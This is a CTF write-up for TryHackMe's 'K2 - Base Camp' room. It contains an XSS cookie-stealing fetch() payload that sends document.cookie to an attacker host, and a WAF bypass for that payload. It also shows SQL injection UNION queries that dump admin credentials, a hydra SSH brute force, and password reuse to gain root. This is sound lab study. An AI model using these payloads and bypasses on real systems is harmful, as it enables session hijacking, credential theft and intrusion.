---
title: "K2 - Base Camp"
date: 2025-07-25
draft: false
summary: "Writeup for K2 - Base Camp CTF challenge on TryHackMe."
tags: ["linux", "hardcoded creds", "sqli"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/k2-basecamp/cover.webp"
  caption: "K2 - Base Camp TryHackMe Challenge"
  alt: "K2 - Base Camp cover"
platform: "TryHackMe"
---

Are you able to make your way through the mountain?
<!--more-->
To access the machine, click on the link given below:
- https://tryhackme.com/room/k2room

> This writeup covers the solution for base camp.
> - middle camp writeup: https://ziomsec.com/writeups/tryhackme/k2---middle-camp/
> - summit writeup: https://ziomsec.com/writeups/tryhackme/k2---summit/

## Reconnaissance

I performed an **nmap** aggressive scan on the target and found 2 open ports, 22 and 80 running **ssh** and **http** respectively.

```shell
nmap -A -p- k2.thm --min-rate 10000 -oN k2.nmap
```

![](https://cdn.ziomsec.com/k2-basecamp/1.webp)

## Initial Foothold

I mapped the *k2.thm* domain to the IP address in my host file and accessed the site through my browser.

![](https://cdn.ziomsec.com/k2-basecamp/2.webp)

The home page contained nothing of interest, so I used **ffuf** to enumerate subdomains and found some.

```shell
ffuf -u http://k2.thm -H "Host: FUZZ.k2.thm" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 13229
```

![](https://cdn.ziomsec.com/k2-basecamp/3.webp)

I updated my host file and accessed the subdomains. Both of them required us to log in using a username and password.

![](https://cdn.ziomsec.com/k2-basecamp/4.webp)

![](https://cdn.ziomsec.com/k2-basecamp/5.webp)

The *it.k2.thm* domain allowed us to register a new user. So I registered a user and logged in. After logging in, I had 2 input fields. I could give a title and a description. Since this was a ticket system, it would likely be reviewed by a privileged user.

![](https://cdn.ziomsec.com/k2-basecamp/6.webp)

I entered a random title and description and got a confirmation that the ticket was being sent for review. I used **Burp**'s **Repeater** tab to test for cross site scripting by making the target send an HTTP request on a web server hosted locally. I used the following script in the title and description and encoded it:

```
Title: <script src='http://ATTACKER_IP/title'></script>
Description: <script src='http://ATTACKER_IP/description'></script>
```

![](https://cdn.ziomsec.com/k2-basecamp/7.webp)

I started an **http** server locally and started receiving requests for the */desc* endpoint, this meant that the description field was vulnerable to cross site scripting.

![](https://cdn.ziomsec.com/k2-basecamp/8.webp)

I then used the following payload to send a base64 encoded cookie of the privileged user interacting with our ticket to our web server.

```
<script>
fetch('http://ATTACKER/cookie='+btoa(document.cookie));
</script>
```

However, this activated the WAF and got blocked.

![](https://cdn.ziomsec.com/k2-basecamp/9.webp)

I then reviewed my payload and modified its characters to find what caused the WAF to block it. I found that *document.cookie* was the problem. So, I used **ChatGPT** to find alternate ways to write *document.cookie* and found a method. 

I replaced *`document.cookie`* with *`document["cookie"]`* and was able to bypass the WAF.

```
<script>
fetch('http://ATTACKER/cookie='+btoa(document["cookie"]));
</script>
```

My web server received the cookie value from the target.

![](https://cdn.ziomsec.com/k2-basecamp/10.webp)

I decoded the cookie.

```shell
echo 'COOKIE' | base64 -d
```

![](https://cdn.ziomsec.com/k2-basecamp/11.webp)

I then added this value to the *admin.k2.thm*.

![](https://cdn.ziomsec.com/k2-basecamp/12.webp)

Since the *ticket.k2.thm* domain had a *dashboard* endpoint, this would also have the same. So I directly navigated to the *dashboard* endpoint and got access to it.

![](https://cdn.ziomsec.com/k2-basecamp/13.webp)

I could filter tickets based on the titles. This functionality could be running on an sql server in the backend, so I forwarded a request made here to **Burp**'s **Repeater** tab.

![](https://cdn.ziomsec.com/k2-basecamp/14.webp)

I tried a simple payload but got blocked by the WAF.

```
' OR 1=1-- -
```

![](https://cdn.ziomsec.com/k2-basecamp/15.webp)

However, when I removed the space between `'` and `OR`, I was able to bypass the filter...

```
'OR 1=1-- -
```

![](https://cdn.ziomsec.com/k2-basecamp/16.webp)

I then enumerated the number of columns and columns that were reflected back to us:

```
'UNION SELECT 1,2,3-- -
```

![](https://cdn.ziomsec.com/k2-basecamp/17.webp)

After finding out the columns, I enumerated the table names present in the current database:

```
'UNION SELECT NULL,NULL,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -
```

![](https://cdn.ziomsec.com/k2-basecamp/18.webp)

The *admin_auth* and *auth_users* seemed interesting, so I enumerated the columns in these tables:

```
'UNION SELECT NULL,NULL,group_concat(column_name) FROM information_schema.columns WHERE table_name="admin_auth"-- -
```

![](https://cdn.ziomsec.com/k2-basecamp/19.webp)

I then looked at the contents inside the *admin_auth* table and found a bunch of username and passwords:

```
'UNION SELECT admin_username,NULL,admin_password FROM admin_auth-- -
```

![](https://cdn.ziomsec.com/k2-basecamp/20.webp)

I created a wordlist of usernames and passwords and brute forced a valid **ssh** credential using **hydra**.

```shell
hydra -L users -P passwords ssh://k2.thm
```

![](https://cdn.ziomsec.com/k2-basecamp/21.webp)

I then logged into the system as *james*.

```shell
ssh james@k2.thm
```

Finally, I captured the user flag from *james*'s home directory.

![](https://cdn.ziomsec.com/k2-basecamp/22.webp)

## Privilege Escalation

Viewing the group membership of *james* revealed that he was part of the *adm* group. This meant that he could read logs inside the */var/log* directory.

```shell
groups
```

![](https://cdn.ziomsec.com/k2-basecamp/23.webp)

I then went through various log files and found a password inside the *nginx* access log.

![](https://cdn.ziomsec.com/k2-basecamp/24.webp)

The password was used with the *rose* user but when i tried using it to switch to *rose*, it failed. I then tried using it against *root* and got access as *root*.

```shell
su root
```

![](https://cdn.ziomsec.com/k2-basecamp/25.webp)

I then captured the *root* flag.

![](https://cdn.ziomsec.com/k2-basecamp/26.webp)

As root, I was able to read the contents inside *rose*'s home directory and found her password in the bash history file.

![](https://cdn.ziomsec.com/k2-basecamp/27.webp)

The */etc/passwd* file also had something unusual, it had the full names of the users Rose and James. I kept note of that as it could be useful in the future.

![](https://cdn.ziomsec.com/k2-basecamp/28.webp)

After successfully pwning the base camp, I moved onto the middle camp.

---
